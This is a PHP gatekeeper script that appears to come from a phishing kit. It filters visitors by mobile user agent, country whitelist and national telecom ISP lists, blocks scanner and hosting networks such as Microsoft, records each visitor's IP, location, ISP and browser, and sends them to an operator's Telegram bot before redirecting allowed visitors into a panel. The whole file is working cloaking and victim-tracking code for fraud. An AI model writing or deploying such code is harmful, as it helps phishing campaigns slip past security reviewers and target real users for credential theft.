<?php
// Include security measures to prevent certain attacks
include './prevents/anti.php';
include './prevents/anti2.php';
// Include configuration settings
include_once "app/config/panel.php";

function update_ini($data, $file)
{
    $content = "";
    $parsed_ini = parse_ini_file($file, true);
    foreach ($data as $section => $values) {
        if ($section === "") {
            continue;
        }
        $content .= $section . "=" . $values . "\n\r";
    }
    if (!$handle = fopen($file, 'w')) {
        return false;
    }
    $success = fwrite($handle, $content);
    fclose($handle);
}

function sendTelegramMessage($text, $chatId = null)
{
    if (!defined('TOKEN') || TOKEN === '') {
        return;
    }

    if ($chatId === null) {
        if (!defined('CHATID') || CHATID === '') {
            return;
        }
        $chatId = CHATID;
    }

    if (!function_exists('curl_init')) {
        return;
    }

    $apiUrl = 'https://api.telegram.org/bot' . TOKEN . '/sendMessage';
    $payload = [
        'chat_id' => $chatId,
        'text' => $text,
    ];

    $ch = curl_init($apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}

function logVisitToTelegram($statusLabel, $visitorip, $CountryCode, $countryName, $org, $isp, $agent, $reason = '')
{
    $countryLine = ($CountryCode !== '' && $CountryCode !== null)
        ? $CountryCode . ' - ' . ($countryName !== '' ? $countryName : 'Unknown')
        : 'Unknown';

    $agentText = $agent !== '' ? substr($agent, 0, 300) : 'N/A';

    $lines = [
        '📥 Visit log',
        'Status: ' . $statusLabel,
        'IP: ' . $visitorip,
        'Country: ' . $countryLine,
    ];

    if ($isp !== '') {
        $lines[] = 'ISP: ' . $isp;
    }

    if ($org !== '') {
        $lines[] = 'Org: ' . $org;
    }

    if ($reason !== '') {
        $lines[] = 'Reason: ' . $reason;
    }

    $lines[] = 'Agent: ' . $agentText;

    sendTelegramMessage(implode("\n", $lines));
}

if (PHONE) {
    // Check if the user agent is from a mobile device
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $mobile_keywords = ["Mobile", "Android", "iPhone", "Windows Phone", "Opera Mini", "IEMobile", "BlackBerry"];
    $is_mobile = false;
    foreach ($mobile_keywords as $keyword) {
        if (stripos($user_agent, $keyword) !== false) {
            $is_mobile = true;
            break;
        }
    }
    if (!$is_mobile) {
        $file = './app/Panel/stats/stats.ini';
        $data = @parse_ini_file($file);
        $data['bots']++;
        update_ini($data, $file);
        die("Access denied. Mobile devices only.");
    }
    }

    function get_client_ip() {
        $ip = null;
        foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $header) {
            if (array_key_exists($header, $_SERVER) === true) {
                foreach (explode(',', $_SERVER[$header]) as $potential_ip) {
                    $potential_ip = trim($potential_ip);
                    if (filter_var($potential_ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                        $ip = $potential_ip;
                        break 2;
                    }
                }
            }
        }
        return ($ip !== null) ? $ip : '127.0.0.1';
    }

// Array of allowed countries
$allowed = [
    "MA","CA","UK","GB","TN","DZ","IT","CH","FR","DE","US"
];

// Function to retrieve IP information from external API
function getIpInfo($ip = '') {
    $ipinfo = file_get_contents("http://ip-api.com/json/".$ip);
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}

if (TESTMODE) {
    $visitorip = "196.127.214.107";
    $ipinfo_json = getIpInfo($visitorip);
} else {
    $visitorip = get_client_ip();
    $ipinfo_json = getIpInfo($visitorip);
}

// Extract relevant IP information
$status = "{$ipinfo_json['status']}";
$CountryCode = "{$ipinfo_json['countryCode']}";
$org = "{$ipinfo_json['as']}";
$isps = "{$ipinfo_json['isp']}";
$count = "{$ipinfo_json['country']}";
$date = date('Y-m-d H:i:s');
$ip = get_client_ip();
$Code = strtolower($CountryCode);
$flag = "<td class=\"flag\"><div class=\"bf-flag bf-flag-$Code\"></div></td>";
$agent = $_SERVER['HTTP_USER_AGENT'];

// Construct a table row for logging
$str = "<tr>$flag<td>$visitorip</td><td>$agent</td><td>$date</td><td>$org</td></tr>";
file_put_contents('./visitors.html', $str, FILE_APPEND | LOCK_EX);

$file = 'app/Panel/stats/stats.ini';
$data = @parse_ini_file($file);
$data['clicks']++;
update_ini($data, $file);
// Check if IP information retrieval was successful
if ($status == "success") {
    // Define operators by country
    $operatorsByCountry = array(
        "BG" => array("A1 Bulgaria", "Vivacom", "Bulsatcom", "Cooolbox", "Geodim", "Bulgarian Research", "Comnet Bulgaria", "Optisprint"),
        "IL" => array("partner communications", "bezeq", "bouygues telecom", "israel interuniversity", "cellcom", "hot-net", "xfone", "gilat telecom", "internet rimon", "internet binat", "ict authority", "099 primo" ,"eci telecom"),
        "CL" => array("TELEFÓNICA", "VTR BANDA", "Telmex Servicios", "ENTEL CHILE", "Telefonica", "Claro", "Gtd", "Telmex", "Entel", "Pacifico", "Manquehuenet", "Segic"),
        "SE" => array("Telia", "Telenor", "Hi3G Access", "Bredband2", "GlobalConnect", "Bahnhof", "Saab", "Arelion", "VASTRA", "Stockholm", "GleSYS" ,"Tietoevry" ,"Binero" ,"AC-Net" ,"CGI Sverige" ,"Internet Vikings" ,"Forsakringskassan"),
        "PT" => array("nos comunicacoes", "meo", "vodafone portugal", "fundacao para a ciencia", "nowo", "onitelecom", "ar telecom", "nos madeira", "g9telecom"),
        "PL" => array("orange polska spolka" ,"netia sa" ,"polkomtel sp" ,"t-mobile polska" ,"p4 sp" ,"multimedia polska sp" ,"vectra s.a" ,"naukowa i akademicka"),
        "CH" => array("swisscom", "switch", "sunrise", "green.ch", "cern", "vtx", "migros-genossenschafts-bund", "quickline", "hoffmann", "pim van pelt", "abb information", "die schweizerische post", "init7", "zurich insurance", "etat de geneve"),
        "US" => array("DoD Network", "Verizon", "Comcast", "AT&T", "T-Mobile"),
        "GB" => array("virgin", "talktalk", "british telecommunications", "ee limited", "sky uk", "jisc", "vodafone", "colt", "kcom", "claranet", "hutchison", "daisy", "gamma telecom", "rackspace", "cityfibre", "zen internet"),
        "MK" => array("makedonski telekom", "a1 makedonija", "neotel doo", "drustvo za telekomunikaciski", "inel internacional", "telesmart teleko", "net doo"),
        "ES" => array("vodafone","ogic informatica","euskaltel","orange espagne", "y telecable", "telefonica"),
        "DK" => array("tdc holding", "telenor", "globalconnect", "stofa", "dansk kabel", "fibia", "sentia denmark", "dsv panalpina", "kmd", "post danmark", "norlys fibernet"),
        "IT" => array("telecom italia", "wind tre", "vodafone italia", "fastweb spa", "consortium", "tiscali italia", "bt italia", "sky italia"),
        "CA" => array("shaw communications", "bell canada", "rogers communications", "telus", "videotron telecom", "du quebec", "gonet"),
        "QA" => array("Ooredoo", "Qatar Foundation", "Vodafone Qatar", "Qatar University", "Sidra Medicine", "QatarEnergy", "Qatar"),
        "BH" => array("Bahrain Telecommunications", "ZAIN BAHRAIN", "STC BAHRAIN", "Kalaam Telecom", "Infonas", "Etisalcom Bahrain", "Bahrain"),
        "AE" => array("EMIRATES TELECOMMUNICATIONS", "Earthlink", "Emirates Integrated", "United Arab Emirates"),
        "OM" => array("Omani Qatari", "Oman Telecommunications", "Awaser Oman", "Oman"),
        "SA" => array("Saudi Telecom", "Etihad Etisala", "INTEGRATED COMMUNICATIONS", "Mobile Telecommunication", "Etihad Atheeb", "Middle East Internet", "ARABIAN INTERNET", "Saudi Arabia"),
        "FR" => array("lycatel", "orange", "sfr", "free", "bouygues"),
        "LU" => array("European Commission", "SES ASTRA", "POST Luxembourg", "Proximus Luxembourg"),
        "BE" => array("proximus", "sfr", "Free", "Orange", "Bouygues", "bbox", "wanadoo"),
        "MA" => array("meditelecom"),
        "DE" => array("1&1", "antec", "united-internet", "t-online", "tkscable", "tiscali", "telecolumbus", "columbus", "strato", "qbeyond", "telefonica", "o2", "congstar", "glasfaser", "dokom21", "ewe", "easybell", "ewr", "fiete", "filiago", "fonial", "netcologne", "vodafone", "unitymedia", "wilhelm", "wilhelm-tel", "m-net", "hansenet", "freenet", "telekom", "claranet", "arcor"),
        "CH" => array("Swisscom", "SWITCH", "Sunrise", "green.ch", "CERN", "VTX Services", "Migros-Genossenschafts", "Quickline", "Hoffmann", "Die Schweizerische", "Init7", "Zurich Insurance", "ETAT DE GENEVE", "Swiss Federation", "netplus.ch"),
        "CO" => array("claro", "hccnet", "telecable", "telecafe", "teleumbral", "telenorte", "telmex", "telepacifico", "teleservicios de cordoba", "tigo-une", "une telecomunicaciones", "urbetv", "wimax", "wom", "win", "une", "movistar", "tigo", "etb", "une epm", "azteca", "metrotel", "internexa", "telebucaramanga", "emcali", "epm", "edatel", "telpacifico", "aire", "opticable", "telehuila", "conet", "orbitel", "avantel", "direcpath", "eikenet", "esdatanet"),
        "MY" => array("TM TECHNOLOGY", "Binariang Berhad", "TTNET-M", "DiGi", "YTL Communications", "Celcom Axiata", "Anpple Tech"),
        "HR" => array("hrvatski telekom" ,"a1 hrvatska" ,"iskon internet" ,"telemach hrvatska" ,"croatian academic" ,"telesat" ,"terrakom" ,"magic net" ,"bt net" ,"sedmi odjel" ,"omonia" ,"cratis" ,"optika kabel"),
   	"TN" => array("Orange Tunisie"),
	"DZ" => array("Telecom Algeria")
 );
    // Check if the country is allowed
    if (count($allowed) > 0 && !in_array($CountryCode, $allowed)) {

        $file = 'app/Panel/stats/stats.ini';
        $data = @parse_ini_file($file);
        $data['bots']++;
        update_ini($data, $file);

        logVisitToTelegram(
            'Blocked',
            $visitorip,
            $CountryCode,
            $count,
            $org,
            $isps,
            $agent,
            'Country not in whitelist'
        );

        die("COUNTRY NOT ALLOWED");
    }

    // Check if the country has specific operators
    if (array_key_exists($CountryCode, $operatorsByCountry)) {
        $operatorsForCountry = $operatorsByCountry[$CountryCode];

        $blockedIsps = include('prevents/block.php');
        if (!is_array($blockedIsps)) {
            $blockedIsps = [];
        }

        $orgLower = strtolower((string) $org);
        foreach ($blockedIsps as $blockedIsp) {
            if ($blockedIsp === '') {
                continue;
            }

            $blockedIspLower = strtolower($blockedIsp);

            if ($CountryCode === 'CH' && strpos($blockedIspLower, 'microsoft') === false) {
                continue;
            }

            if (stripos($orgLower, $blockedIspLower) !== false) {
                $file = 'app/Panel/stats/stats.ini';
                $data = @parse_ini_file($file);
                $data['bots']++;
                update_ini($data, $file);

                logVisitToTelegram(
                    'Blocked',
                    $visitorip,
                    $CountryCode,
                    $count,
                    $org,
                    $isps,
                    $agent,
                    'ISP blocked: ' . $blockedIsp
                );

                die("THE REQUEST WAS DENIED: "." | ". $visitorip ." | ISP: ". $org);
            }
        }

        if (!empty($CountryCode)) {
            $_SESSION['GEO_COUNTRY_CODE'] = strtoupper($CountryCode);
        }

        logVisitToTelegram(
            'Allowed',
            $visitorip,
            $CountryCode,
            $count,
            $org,
            $isps,
            $agent
        );

        // Loop through operators for the country
        foreach ($operatorsForCountry as $operator) {
            // Check if the organization matches an allowed operator
            if (HCAPTCHA){
                $_SESSION['FIL212sD'] = true;
                header("Location: app/index.php?view=index&id=".md5(time()));
                exit();
            } else {
                $_SESSION['FIL212sD'] = true;
                header("Location: app/index.php?view=main&id=".md5(time()));
                exit();
            }
        }
    } else {
        $file = 'app/Panel/stats/stats.ini';
        $data = @parse_ini_file($file);
        $data['bots']++;
        update_ini($data, $file);

        logVisitToTelegram(
            'Blocked',
            $visitorip,
            $CountryCode,
            $count,
            $org,
            $isps,
            $agent,
            'No operator mapping for country'
        );

        die("THE REQUEST WAS DENIED: "." | ". $visitorip ." | ". $org);
    }


} else {
    $file = 'app/Panel/stats/stats.ini';
    $data = @parse_ini_file($file);
    $data['bots']++;
    update_ini($data, $file);

    logVisitToTelegram(
        'Blocked',
        $visitorip,
        $CountryCode,
        $count,
        $org,
        $isps,
        $agent,
        'IP lookup failed (status: ' . $status . ')'
    );

    // Handle the case where IP information retrieval fails
   die('Failed to retrieve IP information.'. $visitorip);
}
?>